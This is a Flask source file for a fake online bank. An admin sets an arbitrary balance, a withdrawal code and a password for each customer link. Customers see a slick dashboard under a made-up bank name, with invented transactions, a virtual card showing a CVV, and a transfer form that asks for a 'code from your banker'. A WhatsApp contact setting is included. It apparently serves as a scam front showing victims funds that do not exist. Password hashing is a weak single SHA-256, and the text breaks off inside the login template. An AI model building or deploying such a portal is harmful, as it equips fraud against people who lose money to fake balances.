# app.py — Flask + Neon Postgres + Premium UI + Admin Builder
import os, uuid, hashlib, secrets, time, json
import psycopg
from psycopg.rows import dict_row
from urllib.parse import quote
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session, abort
from functools import wraps

DATABASE_URL     = os.environ.get("DATABASE_URL", "").strip()
WHATSAPP_NUMBER  = os.environ.get("WHATSAPP_NUMBER", "").strip()
BANK_NAME        = os.environ.get("BANK_NAME", "Aurora Trust Bank")

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ---------------- db ----------------

def get_conn():
    return psycopg.connect(DATABASE_URL, row_factory=dict_row)

def init_db():
    with get_conn() as conn:
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    value TEXT
                );
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS links (
                    slug TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    currency TEXT NOT NULL DEFAULT 'USD',
                    balance REAL NOT NULL DEFAULT 0,
                    withdraw_code TEXT NOT NULL,
                    password_hash TEXT,
                    transactions TEXT,
                    withdrawn BOOLEAN NOT NULL DEFAULT FALSE,
                    bank TEXT,
                    account TEXT,
                    withdrawn_amount REAL,
                    created BIGINT NOT NULL
                );
            """)
            try:
                cur.execute("ALTER TABLE links ADD COLUMN IF NOT EXISTS password_hash TEXT")
                cur.execute("ALTER TABLE links ADD COLUMN IF NOT EXISTS transactions TEXT")
            except Exception:
                pass
        conn.commit()

def get_admin_hash():
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("SELECT value FROM config WHERE key='admin_hash'")
        row = cur.fetchone()
        return row['value'] if row else None

def set_admin_hash(h):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            INSERT INTO config (key, value) VALUES ('admin_hash', %s)
            ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
        """, (h,))
        conn.commit()

def hash_pw(pw):
    if not pw: return None
    salt = secrets.token_hex(16)
    return salt + ":" + hashlib.sha256((salt + pw).encode()).hexdigest()

def check_pw(pw, stored):
    if not stored or not pw: return False
    try: salt, h = stored.split(":", 1)
    except ValueError: return False
    return hashlib.sha256((salt + pw).encode()).hexdigest() == h

def db_list_links():
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("SELECT * FROM links ORDER BY created DESC")
        return cur.fetchall()

def db_get_link(slug):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("SELECT * FROM links WHERE slug=%s", (slug,))
        return cur.fetchone()

def db_put_link(rec):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            INSERT INTO links (slug, name, currency, balance, withdraw_code, password_hash, transactions, withdrawn, bank, account, withdrawn_amount, created)
            VALUES (%(slug)s, %(name)s, %(currency)s, %(balance)s, %(withdraw_code)s, %(password_hash)s, %(transactions)s, %(withdrawn)s, %(bank)s, %(account)s, %(withdrawn_amount)s, %(created)s)
            ON CONFLICT (slug) DO UPDATE SET
                name=EXCLUDED.name, currency=EXCLUDED.currency, balance=EXCLUDED.balance,
                withdraw_code=EXCLUDED.withdraw_code, password_hash=EXCLUDED.password_hash,
                transactions=EXCLUDED.transactions, withdrawn=EXCLUDED.withdrawn,
                bank=EXCLUDED.bank, account=EXCLUDED.account, withdrawn_amount=EXCLUDED.withdrawn_amount
        """, {
            "slug": rec["slug"], "name": rec["name"], "currency": rec["currency"],
            "balance": rec["balance"], "withdraw_code": rec["withdraw_code"],
            "password_hash": rec.get("password_hash"), "transactions": rec.get("transactions"),
            "withdrawn": rec.get("withdrawn", False), "bank": rec.get("bank"),
            "account": rec.get("account"), "withdrawn_amount": rec.get("withdrawn_amount"),
            "created": rec.get("created", 0),
        })
        conn.commit()

def db_delete_link(slug):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("DELETE FROM links WHERE slug=%s", (slug,))
        conn.commit()

# ---------------- auth ----------------

def admin_required(f):
    @wraps(f)
    def w(*a, **k):
        if not session.get("admin"): return redirect(url_for("admin_page"))
        return f(*a, **k)
    return w

def user_required(f):
    @wraps(f)
    def w(slug, *a, **k):
        rec = db_get_link(slug)
        if not rec: abort(404)
        if rec.get("password_hash") and not session.get(f"auth_{slug}"):
            return redirect(url_for("user_login", slug=slug))
        return f(slug, *a, **k)
    return w

# ---------------- UI Assets ----------------

BANK_CSS = """
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#080b12;color:#ffffff;font-family:'Inter',system-ui,sans-serif;margin:0;padding-bottom:110px;overflow-x:hidden}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:2rem 1.5rem 1rem}
.greet{font-size:1.4rem;font-weight:600;line-height:1.2}
.greet span{display:block;font-size:1.6rem}
.avatar-wrap{position:relative}
.avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#60a5fa);display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:600}
.badge{position:absolute;bottom:0;right:-2px;background:#3b82f6;border:2px solid #080b12;border-radius:50%;width:18px;height:18px;display:flex;align-items:center;justify-content:center}
.wrap{max-width:500px;margin:0 auto;padding:0 1rem}
.section-title{font-size:1rem;font-weight:600;margin:0 0 1rem;display:flex;justify-content:space-between;align-items:center}
.section-title a{color:#34d399;font-size:.8rem;text-decoration:none;cursor:pointer}

/* Hero Card */
.hero-card{
  background:linear-gradient(135deg, #2d2b55 0%, #1e3a8a 40%, #0f766e 100%);
  border-radius:24px;padding:1.5rem;position:relative;overflow:hidden;
  box-shadow:0 20px 40px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.2);
  margin-bottom:2rem;
}
.hero-card::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 180deg at 50% 50%, rgba(74,222,128,.2) 0deg, rgba(96,165,250,.2) 120deg, transparent 240deg);animation:spin 15s linear infinite;z-index:0;filter:blur(30px)}
@keyframes spin{100%{transform:rotate(360deg)}}
.hero-content{position:relative;z-index:1}
.bank-logo-sm{display:flex;align-items:center;gap:.5rem;margin-bottom:1.5rem}
.bank-logo-sm .icon{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,#2dd4bf,#60a5fa);display:flex;align-items:center;justify-content:center}
.bank-logo-sm .txt{font-size:.75rem;font-weight:500;color:rgba(255,255,255,.9);line-height:1.1}
.balance-lbl{font-size:.75rem;color:rgba(255,255,255,.7)}
.balance{font-size:2.2rem;font-weight:700;margin:.2rem 0 .4rem;letter-spacing:-.5px}
.acct-info{font-size:.75rem;color:rgba(255,255,255,.7);margin-bottom:1.5rem}
.action-btns{display:flex;gap:.8rem}
.action-btns button{flex:1;padding:.7rem;border-radius:12px;font-size:.85rem;font-weight:600;border:1px solid rgba(255,255,255,.3);background:rgba(255,255,255,.1);color:#fff;backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;gap:.4rem;cursor:pointer;transition:.2s}
.action-btns button:hover{transform:scale(1.02)}

/* Quick Actions */
.quick-actions{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:2rem;text-align:center}
.qa{display:flex;flex-direction:column;align-items:center;gap:.4rem;cursor:pointer;text-decoration:none;color:#fff}
.qa-icon{width:54px;height:54px;border-radius:50%;background:#141926;display:flex;align-items:center;justify-content:center;transition:.2s}
.qa-icon svg{width:24px;height:24px;fill:none;stroke:#60a5fa;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.qa:hover .qa-icon{background:#1f2a44;transform:translateY(-2px)}
.qa span{font-size:.7rem;color:rgba(255,255,255,.8);font-weight:500}

/* Transactions */
.tx-list{background:#111827;border-radius:20px;padding:.5rem 1.2rem;margin-bottom:1.5rem;min-height:80px}
.tx{display:flex;justify-content:space-between;align-items:center;padding:1.2rem 0;border-bottom:1px solid #1f2a44}
.tx:last-child{border-bottom:0}
.tx .left{display:flex;gap:1rem;align-items:center}
.tx .dot{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;flex-shrink:0}
.tx .dot.pos{background:rgba(74,222,128,.15)}
.tx .dot.pos svg{stroke:#4ade80}
.tx .dot.neg{background:rgba(248,113,113,.15)}
.tx .dot.neg svg{stroke:#f87171}
.tx .dot svg{width:20px;height:20px;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.tx .ttl{font-size:.9rem;font-weight:600}
.tx .sub{font-size:.7rem;color:#7d8bab;margin-top:.2rem}
.tx .amt{font-weight:600;font-size:.9rem}
.tx .amt.pos{color:#4ade80}.tx .amt.neg{color:#f87171}
.empty-tx{text-align:center;color:#7d8bab;font-size:.85rem;padding:2rem 0}

/* Bottom Tab */
.tabbar{position:fixed;bottom:0;left:0;right:0;background:#0b0f19;border-top:1px solid #1f2a44;display:flex;justify-content:space-around;padding:.6rem .5rem 1.2rem;z-index:50;padding-bottom:calc(1.2rem + env(safe-area-inset-bottom))}
.tab{flex:1;display:flex;flex-direction:column;align-items:center;gap:.3rem;padding:.5rem;color:#7d8bab;text-decoration:none;font-size:.65rem;font-weight:600;cursor:pointer;background:none;border:0;transition:.2s}
.tab.active{color:#ffffff}
.tab.active .ico-wrap{background:#1e293b;border-radius:12px}
.ico-wrap{padding:.3rem .8rem;display:flex;align-items:center;justify-content:center;transition:.2s}
.tab svg{width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}

/* Forms & Generic Cards */
.card{background:#111827;border:1px solid #1f2a44;border-radius:20px;padding:1.5rem;margin-bottom:1.5rem}
label{display:block;font-size:.8rem;color:#9aa7c7;margin-top:1rem;font-weight:500}
input,select{width:100%;padding:1rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:14px;box-sizing:border-box;margin-top:.4rem;font-size:.95rem;font-family:inherit;outline:none}
input:focus{border-color:#3b82f6;box-shadow:0 0 0 2px rgba(59,130,246,.2)}
button.primary{width:100%;padding:1rem;border:0;border-radius:14px;cursor:pointer;font-weight:700;background:#34d399;color:#06210f;font-size:1rem;margin-top:1.5rem;transition:.2s}
button.primary:hover{background:#10b981}
button.primary:disabled{opacity:.6;cursor:not-allowed}
.msg{margin-top:1rem;font-size:.85rem;padding:1rem;border-radius:12px;display:none;text-align:center;font-weight:500}
.msg.show{display:block}
.msg.err{color:#fca5a5;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3)}
.msg.ok{color:#86efac;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3)}
.back{display:inline-flex;align-items:center;gap:.4rem;color:#9aa7c7;text-decoration:none;font-size:.9rem;margin-bottom:1rem;cursor:pointer}
.back:hover{color:#e8eefc}

/* Password Inputs */
.pw-wrap{position:relative}
.pw-wrap input{padding-right:3rem}
.pw-toggle{position:absolute;right:1rem;top:50%;transform:translateY(-50%);cursor:pointer;color:#7d8bab;background:none;border:none;padding:0;margin:0;display:flex;align-items:center;justify-content:center}
.pw-toggle svg{width:20px;height:20px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.pw-toggle:hover{color:#e8eefc}
"""

BOTTOM_TAB = """
<div class="tabbar">
  <a class="tab {{ 'active' if active=='dashboard' else '' }}" href="{{ url_for('user_page', slug=slug, page='dashboard') }}">
    <div class="ico-wrap"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></div><span>Dashboard</span>
  </a>
  <a class="tab {{ 'active' if active=='history' else '' }}" href="{{ url_for('user_page', slug=slug, page='history') }}">
    <div class="ico-wrap"><svg viewBox="0 0 24 24"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg></div><span>History</span>
  </a>
  <a class="tab {{ 'active' if active=='transfer' else '' }}" href="{{ url_for('user_page', slug=slug, page='transfer') }}">
    <div class="ico-wrap"><svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div><span>Transfer</span>
  </a>
  <a class="tab {{ 'active' if active=='cards' else '' }}" href="{{ url_for('user_page', slug=slug, page='cards') }}">
    <div class="ico-wrap"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div><span>Vault</span>
  </a>
  <a class="tab {{ 'active' if active=='settings' else '' }}" href="{{ url_for('user_page', slug=slug, page='settings') }}">
    <div class="ico-wrap"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div><span>Settings</span>
  </a>
</div>
"""

# ---------------- Dashboard ----------------

DASHBOARD_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>{{ name }} — {{ bank }}</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>

<div class="topbar">
  <div class="greet">Good afternoon,<span>{{ name.split(' ')[0] }}</span></div>
  <div class="avatar-wrap">
    <div class="avatar">{{ name[0]|upper }}</div>
    <div class="badge"><svg viewBox="0 0 24 24" fill="#fff" width="10" height="10"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
  </div>
</div>

<div class="wrap">
  <div class="hero-card">
    <div class="hero-content">
      <div class="bank-logo-sm">
        <div class="icon"><svg viewBox="0 0 24 24" fill="#fff" width="14" height="14"><path d="M12 2L2 22h20L12 2z"/></svg></div>
        <div class="txt">{{ bank }}<br>Premium</div>
      </div>
      <div class="balance-lbl">Total Balance</div>
      <div class="balance">{{ currency }} {{ "%.2f"|format(balance) }}</div>
      <div class="acct-info">Account Number {{ acct_full }} · {{ bank }}</div>
      
      <div class="action-btns">
        <a href="{{ url_for('user_page', slug=slug, page='transfer') }}" style="flex:1;text-decoration:none">
          <button style="width:100%">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
            Send Money
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="quick-actions">
    <a href="{{ url_for('user_page', slug=slug, page='transfer') }}" class="qa">
      <div class="qa-icon"><svg viewBox="0 0 24 24"><path d="M17 1l4 4-4 4"></path><path d="M3 11V9a4 4 0 0 1 4-4h14"></path><path d="M7 23l-4-4 4-4"></path><path d="M21 13v2a4 4 0 0 1-4 4H3"></path></svg></div>
      <span>Transfer</span>
    </a>
    <a href="{{ url_for('user_page', slug=slug, page='cards') }}" class="qa">
      <div class="qa-icon"><svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
      <span>Cards</span>
    </a>
    <a href="{{ url_for('user_page', slug=slug, page='history') }}" class="qa">
      <div class="qa-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg></div>
      <span>History</span>
    </a>
    <a href="{{ url_for('user_page', slug=slug, page='settings') }}" class="qa">
      <div class="qa-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div>
      <span>Settings</span>
    </a>
  </div>

  <div class="section-title">
    Recent Transactions
    <a href="{{ url_for('user_page', slug=slug, page='history') }}">See all</a>
  </div>

  <div class="tx-list">
    {% if tx_list %}
      {% for tx in tx_list %}
        <div class="tx">
          <div class="left">
            <div class="dot {{ 'pos' if tx.amount > 0 else 'neg' }}">
              {% if tx.amount > 0 %}
                <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
              {% else %}
                <svg viewBox="0 0 24 24"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
              {% endif %}
            </div>
            <div>
              <div class="ttl">{{ tx.name }}</div>
              <div class="sub">{{ tx.date }}</div>
            </div>
          </div>
          <div class="amt {{ 'pos' if tx.amount > 0 else 'neg' }}">
            {{ '+' if tx.amount > 0 else '-' }}{{ currency }} {{ "{:,.2f}".format(tx.amount|abs) }}
          </div>
        </div>
      {% endfor %}
    {% else %}
      <div class="empty-tx">No transactions yet.</div>
    {% endif %}
  </div>
</div>

{{ tab|safe }}
</body></html>
"""

# ---------------- History Page ----------------

HISTORY_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>History — {{ bank }}</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>
<div class="topbar">
  <div class="greet">Transaction<span>History</span></div>
  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
</div>
<div class="wrap">
  <div class="tx-list" style="margin-top:1rem">
    {% if tx_list %}
      {% for tx in tx_list %}
        <div class="tx">
          <div class="left">
            <div class="dot {{ 'pos' if tx.amount > 0 else 'neg' }}">
              {% if tx.amount > 0 %}
                <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
              {% else %}
                <svg viewBox="0 0 24 24"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
              {% endif %}
            </div>
            <div>
              <div class="ttl">{{ tx.name }}</div>
              <div class="sub">{{ tx.date }}</div>
            </div>
          </div>
          <div class="amt {{ 'pos' if tx.amount > 0 else 'neg' }}">
            {{ '+' if tx.amount > 0 else '-' }}{{ currency }} {{ "{:,.2f}".format(tx.amount|abs) }}
          </div>
        </div>
      {% endfor %}
    {% else %}
      <div class="empty-tx" style="padding:4rem 0">
        <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="1.5" width="48" height="48" style="margin-bottom:1rem"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg>
        <br>No history available yet.<br>Your transactions will appear here.
      </div>
    {% endif %}
  </div>
</div>
{{ tab|safe }}
</body></html>
"""

# ---------------- Transfer (Withdraw) Page ----------------

TRANSFER_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Send Money — {{ bank }}</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>
<div class="topbar">
  <div class="greet">Send<span>Money</span></div>
  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
</div>
<div class="wrap">
  {% if withdrawn %}
    <div class="card" style="text-align:center;padding:2.5rem 1.5rem;margin-top:2rem">
      <div style="font-size:3rem;margin-bottom:1rem">✅</div>
      <h2 style="margin:0 0 .5rem;font-size:1.2rem">Already processed</h2>
      <p style="color:#9aa7c7;font-size:.9rem;margin:0">This account has already been transferred from. Contact the admin if this is unexpected.</p>
    </div>
  {% else %}
    <div class="card">
      <p style="color:#9aa7c7;font-size:.9rem;margin:0 0 1rem">Funds will be sent to the bank account you enter below.</p>

      <label>Bank name</label>
      <input id="bank" placeholder="e.g. Chase, GTBank" autocomplete="off">

      <label>Account number</label>
      <input id="acct" placeholder="10-digit account number" inputmode="numeric" autocomplete="off">

      <label>Amount ({{ currency }})</label>
      <input id="amt" type="number" step="0.01" placeholder="0.00" inputmode="decimal">

      <label>Withdrawal code</label>
      <div class="pw-wrap">
        <input id="code" type="password" placeholder="code from your banker" autocomplete="off">
        <button type="button" class="pw-toggle" onclick="togglePw('code')">
          <svg id="eye-code" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
        </button>
      </div>

      <button class="primary" id="btn" onclick="go()">Confirm Transfer</button>
      <div class="msg" id="msg"></div>
    </div>
  {% endif %}
</div>
{{ tab|safe }}
<script>
function togglePw(id){
  const el = document.getElementById(id);
  const icon = document.getElementById('eye-'+id);
  if(el.type === 'password'){
    el.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
  } else {
    el.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
  }
}

async function go(){
  const btn=document.getElementById('btn');
  const msg=document.getElementById('msg');
  const body={
    bank:document.getElementById('bank').value.trim(),
    account:document.getElementById('acct').value.trim(),
    amount:parseFloat(document.getElementById('amt').value||'0'),
    code:document.getElementById('code').value
  };
  if(!body.bank){ msg.className='msg err show'; msg.textContent='bank name required'; return; }
  if(!body.account){ msg.className='msg err show'; msg.textContent='account number required'; return; }
  if(!(body.amount>0)){ msg.className='msg err show'; msg.textContent='enter a valid amount'; return; }
  if(!body.code){ msg.className='msg err show'; msg.textContent='withdrawal code required'; return; }
  btn.disabled=true; msg.className='msg show'; msg.textContent='processing…';
  try{
    const r=await fetch('/v/{{slug}}/withdraw/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    if(r.ok&&d.ok){
      msg.className='msg ok show'; msg.textContent='Transfer approved — redirecting…';
      setTimeout(()=>location.href='/v/{{slug}}/dashboard',900);
    } else {
      msg.className='msg err show'; msg.textContent=d.error||'failed';
      btn.disabled=false;
    }
  }catch(e){
    msg.className='msg err show'; msg.textContent='network error — try again';
    btn.disabled=false;
  }
}
</script>
</body></html>
"""

# ---------------- Cards / Vault Page ----------------

CARDS_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Cards — {{ bank }}</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>
<div class="topbar">
  <div class="greet">Your<span>Cards & Vault</span></div>
  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
</div>
<div class="wrap">
  <div class="hero-card" style="height:200px;display:flex;flex-direction:column;justify-content:space-between">
    <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1">
      <div class="bank-logo-sm" style="margin:0">
        <div class="txt">{{ bank }}<br>Debit</div>
      </div>
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" width="24" height="24"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>
    </div>
    <div style="position:relative;z-index:1">
      <div style="font-family:monospace;font-size:1.4rem;letter-spacing:2px;margin-bottom:.5rem">•••• •••• •••• {{ acct_last }}</div>
      <div style="display:flex;justify-content:space-between;font-size:.75rem;color:rgba(255,255,255,.7)">
        <span>{{ name|upper }}</span><span>09/28</span>
      </div>
    </div>
  </div>
  
  <div class="card" style="margin-top:1rem">
    <h3 style="margin:0 0 .5rem;font-size:1rem">Card Status</h3>
    <p style="color:#9aa7c7;font-size:.9rem;margin:0 0 1rem">Your virtual card is active and ready for online transactions.</p>
    <div style="display:flex;justify-content:space-between;align-items:center;padding:1rem 0;border-top:1px solid #1f2a44">
      <span style="font-size:.9rem">Freeze Card</span>
      <input type="checkbox" style="width:40px;height:20px;margin:0" onclick="alert('Card frozen/unfrozen.')">
    </div>
    <div style="display:flex;justify-content:space-between;align-items:center;padding:1rem 0;border-top:1px solid #1f2a44">
      <span style="font-size:.9rem">View CVV</span>
      <button id="cvv-btn" onclick="showCVV('{{ cvv }}')" style="background:#1f2a44;border:0;color:#fff;padding:.4rem .8rem;border-radius:8px;font-size:.75rem">View</button>
    </div>
  </div>
</div>
{{ tab|safe }}
<script>
function showCVV(cvv){
  const btn = document.getElementById('cvv-btn');
  btn.textContent = cvv;
  btn.style.background = 'transparent';
  btn.style.fontFamily = 'monospace';
  btn.style.fontSize = '1rem';
  btn.style.fontWeight = '700';
  btn.style.color = '#34d399';
}
</script>
</body></html>
"""

# ---------------- Settings Page ----------------

SETTINGS_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Settings — {{ bank }}</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>{{ css|safe }}</style></head><body>
<div class="topbar">
  <div class="greet">Account<span>Settings</span></div>
  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
</div>
<div class="wrap">
  <div class="card" style="display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem">
    <div class="avatar" style="width:60px;height:60px;font-size:1.5rem">{{ name[0]|upper }}</div>
    <div>
      <div style="font-size:1.1rem;font-weight:600">{{ name }}</div>
      <div style="font-size:.85rem;color:#9aa7c7">Account: {{ acct_full }}</div>
    </div>
  </div>
  
  <div class="card" style="padding:0;overflow:hidden">
    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center">
      <span style="font-size:.9rem;font-weight:500">Email Notifications</span>
      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
    </div>
    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center">
      <span style="font-size:.9rem;font-weight:500">Biometric Login</span>
      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
    </div>
    <div style="padding:1.2rem;display:flex;justify-content:space-between;align-items:center">
      <span style="font-size:.9rem;font-weight:500">Dark Mode</span>
      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
    </div>
  </div>

  <div class="card" style="padding:0;overflow:hidden">
    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center;cursor:pointer">
      <span style="font-size:.9rem;font-weight:500">Privacy Policy</span>
      <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="2" width="16" height="16"><polyline points="9 18 15 12 9 6"></polyline></svg>
    </div>
    <div style="padding:1.2rem;display:flex;justify-content:space-between;align-items:center;cursor:pointer">
      <span style="font-size:.9rem;font-weight:500">Terms of Service</span>
      <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="2" width="16" height="16"><polyline points="9 18 15 12 9 6"></polyline></svg>
    </div>
  </div>
  
  <a href="{{ url_for('user_logout', slug=slug) }}" style="text-decoration:none"><button class="primary" style="background:#2a0f14;color:#fca5a5">Log Out</button></a>
</div>
{{ tab|safe }}
</body></html>
"""

# ---------------- User Auth & Routing ----------------

LOGIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Login — {{ bank }}</title>
